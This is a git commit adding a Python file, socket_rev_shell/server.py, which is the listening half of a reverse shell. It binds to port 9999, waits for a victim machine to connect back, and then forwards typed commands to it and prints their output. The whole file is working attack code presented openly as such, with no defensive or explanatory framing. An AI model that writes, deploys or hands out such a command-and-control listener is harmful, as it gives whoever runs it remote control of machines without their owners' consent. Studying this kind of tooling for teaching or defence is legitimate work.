28dacbe78b337f49adbd01e02502e38789417278
RtjShreyD <shreyanshece1041@gmail.com>
2020-04-20 04:44:00 +0530

    Rev_shell server

---
+++ socket_rev_shell/server.py
@@ -0,0 +1,71 @@
+import socket
+import sys
+import threading
+import time
+from queue import Queue
+
+NUMBER_OF_THREADS = 2
+JOB_NUMBER = [1, 2]
+queue = Queue()
+all_connections = []
+all_address = []
+
+host = ""
+port = ""
+s = ""
+
+def create_socket():
+    try:
+        global host
+        global port
+        global s
+        host = ""
+        port = 9999
+        s = socket.socket()
+
+    except socket.error as msg:
+        print("Socket creation error: " + str(msg))
+
+
+def bind_socket():
+    try:
+        global host
+        global port
+        global s
+        print("Binding the Port: " + str(port))
+
+        s.bind((host, port))
+        s.listen(5)
+
+    except socket.error as msg:
+        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
+        bind_socket()
+
+
+def socket_accept():
+    conn, address = s.accept()
+    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
+    send_commands(conn)
+    conn.close()
+
+
+def send_commands(conn):
+    while True:
+        cmd = input()
+        if cmd == 'quit':
+            conn.close()
+            s.close()
+            sys.exit()
+        if len(str.encode(cmd)) > 0:
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024),"utf-8")
+            print(client_response, end="")
+
+
+def main():
+    create_socket()
+    bind_socket()
+    socket_accept()
+
+
+main()
